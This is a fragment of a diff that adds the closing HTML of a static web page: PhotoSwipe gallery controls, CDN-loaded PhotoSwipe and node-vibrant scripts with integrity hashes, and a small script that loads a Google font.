+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
